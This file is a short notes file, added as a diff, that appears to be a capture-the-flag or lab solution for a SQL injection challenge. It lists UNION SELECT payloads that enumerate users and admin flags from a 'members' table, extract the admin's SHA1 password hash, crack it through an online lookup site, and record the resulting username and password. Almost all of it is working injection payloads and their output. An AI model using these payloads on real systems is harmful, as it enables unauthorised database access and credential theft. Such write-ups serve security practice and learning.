@@ -1,0 +1,37 @@
+
+q=a'
+
+--> SELECT username, admin FROM members WHERE username LIKE 'a'%'
+
+q=a' UNION SELECT username,admin FROM members --
+
+--> Asgard
+    ...
+
+q=a' UNION SELECT admin,username FROM members --
+
+--> 0
+    ...
+
+q=a' UNION SELECT username,admin FROM members WHERE admin=1 --
+
+--> bellamond
+
+
+q=a' UNION SELECT password,username FROM members WHERE username='bellamond' --
+
+--> 1b774bc166f3f8918e900fcef8752817bae76a37
+
+
+https://md5hashing.net/hash/sha1/1b774bc166f3f8918e900fcef8752817bae76a37
+
+--> sup3r
+
+Username: bellamond
+Password: sup3r
+
+
+
+
+
+
